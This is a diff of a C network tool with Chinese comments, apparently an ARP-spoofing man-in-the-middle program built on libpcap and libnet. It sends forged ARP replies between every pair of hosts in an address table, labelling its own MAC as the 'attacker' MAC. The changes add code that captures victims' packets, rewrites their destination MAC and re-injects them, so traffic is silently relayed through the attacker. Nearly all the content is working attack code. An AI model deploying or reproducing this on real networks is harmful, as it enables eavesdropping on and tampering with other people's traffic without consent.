@@ -13,7 +13,7 @@
 #include<arpa/inet.h>
 #include<pthread.h>
 #define SIZE_ETHERNET 14
-#define PACKETS_NUMBERS 50
+#define PACKETS_NUMBERS 5000
 
 #define ARP_REQUEST 1
 #define ARP_REPLY   2
@@ -32,6 +32,7 @@ int send_packets();//用于数据包转发
 struct ip_mac ip_form[MAX_IP_NUM];
 int ip_num;
 char* device;
+pcap_t* handle=NULL;
 int main()
 {
     pcap_if_t*  alldevsp=NULL;
@@ -49,7 +50,7 @@ int main()
             	ip_form[ip_num].ip[strlen(ip_form[ip_num].ip)-1]='\0';//去除表中\n字符
 	    ip_num++;
     }
-    ip_num--;
+    ip_num-=2;
     device=pcap_lookupdev(errbuf);//device是设备名
     if(device)
     {
@@ -62,7 +63,6 @@ int main()
 	    exit(1);
     }
 
-    pcap_t* handle=NULL;
     handle=pcap_open_live(device,65535,1,0,errbuf);
     if(handle)
     {
@@ -281,12 +281,25 @@ void analyze_packets(u_char *args, const struct pcap_pkthdr *header,const u_char
     	printf("源端口     :%d\n",ntohs(tcp->th_sport));
     	printf("目的端口   :%d\n",ntohs(tcp->th_dport));
     	printf("Tcp数据包数量%d\tudp数据包数量%d\ticmp数据包数量%d\n",tcp_num,udp_num,icmp_num);
-	
-  	  unsigned int size_tcp=TH_OFF(tcp)*4;
-  	  payload=(u_char*)(packet+14+20+size_tcp);
-  	 const u_char *ch=payload;
-  	 const u_char *ch2=payload; 
-  	 for(unsigned int i=0;i<header->len;)//
+
+        if(strcmp(inet_ntoa(ip->ip_dst),get_ip(device))!=0)	
+	for(int i=0;i<ip_num;i++)
+	{
+		if(strcmp(ip_form[i].ip,inet_ntoa(ip->ip_dst))==0)
+		{
+			strcpy((char*)ethernet->mac_dhost,(char*)ip_form[i].mac);
+	                if(pcap_inject(handle,packet,header->len)==PCAP_ERROR)
+	                {
+		        	printf("send packet error\n");
+                	}
+			break;
+		}
+	}
+  	unsigned int size_tcp=TH_OFF(tcp)*4;
+  	payload=(u_char*)(packet+14+20+size_tcp);
+  	const u_char *ch=payload;
+  	const u_char *ch2=payload; 
+  	for(unsigned int i=0;i<header->len;)//
   	 {
   	         for(unsigned int j=0;j<16;j++)
   	         {
@@ -425,7 +438,7 @@ int get_mac(char* device,u_int8_t* src_mac)
 	if(sockfd==-1)
 	{
 		printf("get mac error\n");
-		return (-1);
+		exit(-1);
 	}
 	strncpy(ifr.ifr_name,device,IFNAMSIZ);
         if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0)
@@ -438,7 +451,6 @@ int get_mac(char* device,u_int8_t* src_mac)
 
 int send_arp(u_int8_t* dst_ip_str,char* device)
 {
-
 	libnet_t *handle;
 	int packet_size;
 	u_int8_t src_mac[6];
@@ -447,25 +459,27 @@ int send_arp(u_int8_t* dst_ip_str,char* device)
 	u_int8_t dst_mac[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};//广播地址 目的MAC
 	u_int8_t rev_mac[6]={0x00,0x00,0x00,0x00,0x00,0x00};
 	u_int32_t  dst_ip,src_ip;
+	printf("send_arp:\n%s\t%s\t%s\n",(char*)src_mac,src_ip_str,dst_mac);
         libnet_ptag_t arp_proto_tag, eth_proto_tag;
-
-        if ( dst_ip == -1 || src_ip == -1 )
-        {
-            printf("ip address convert error\n");
-            exit(-1);
-        }
         /* 初始化Libnet,注意第一个参数和TCP初始化不同 */
         if ( (handle = libnet_init(LIBNET_LINK_ADV, device, errbuf)) == NULL ) 
         {
             printf("libnet_init: error [%s]\n", errbuf);
             exit(-2);
         }
+	printf("send_arp\n");
+	printf("\ndst_ip_str %s\nsrc_ip_str%s\n",dst_ip_str,src_ip_str);
     
         /* 把目的IP地址字符串转化成网络序 */
         dst_ip = libnet_name2addr4(handle,(char*)dst_ip_str, LIBNET_RESOLVE);
         /* 把源IP地址字符串转化成网络序 */
         src_ip = libnet_name2addr4(handle,(char*)src_ip_str, LIBNET_RESOLVE);
     
+        if ( dst_ip == -1 || src_ip == -1 )
+	{
+            printf("send_arp ip address convert error\n");
+	    exit(-1);
+	}
         /* 构造arp协议块 */
         arp_proto_tag = libnet_build_arp(
                     ARPHRD_ETHER,        /* 硬件类型,1表示以太网硬件地址 */
@@ -503,35 +517,35 @@ int send_arp(u_int8_t* dst_ip_str,char* device)
         packet_size = libnet_write(handle);    /* 发送已经构造的数据包*/
         if(packet_size);
         libnet_destroy(handle);                /* 释放句柄 */
-        return 0;	
+	return 0;	
 }
 
 void*  send_arp_reply(void* a)
 {
 	while(1)
 	{
+		printf("send_reply\n");
+		sleep(1);
 		libnet_t* handle;
 		int packet_size;
 		for(int src=0;src<ip_num;src++)
 		{
 			for(int dst=0;dst<ip_num;dst++)
 			{
-				if((strcmp((char*)ip_form[src].ip,ip_form[dst].ip)==0))
+				if(strcmp((char*)ip_form[src].ip,ip_form[dst].ip)==0&&(strcmp(ip_form[dst].mac,"")!=0))
 					continue;
 				u_int8_t src_mac[6];//攻击者MAC地址
 				get_mac(device,src_mac);
 				u_int32_t dst_ip,src_ip;
 				libnet_ptag_t arp_proto_tag,eth_proto_tag;
-				if(dst_ip==-1||src_ip==-1)
-				{
-					printf("ip address convert error\n");
-				}
 				if((handle=libnet_init(LIBNET_LINK_ADV,device,errbuf))==NULL)
 				{
 					printf("libnet_init:errbuf %s\n",errbuf);
 				}
 				dst_ip=libnet_name2addr4(handle,ip_form[src].ip,LIBNET_RESOLVE);
 				src_ip=libnet_name2addr4(handle,ip_form[dst].ip,LIBNET_RESOLVE);
+				if(dst_ip==-1||src_ip==-1)
+					printf("ip address convert error\n");
 				arp_proto_tag=libnet_build_arp(
 						ARPHRD_ETHER,
 						ETHERTYPE_IP,
@@ -571,15 +585,6 @@ void*  send_arp_reply(void* a)
 		}
 	}
 }
-
-int send_packets()
-{
-	libnet_t* net_t=NULL;
-	
-	libnet_destroy(net_t);
-	return 0;
-}
-
 
 
 
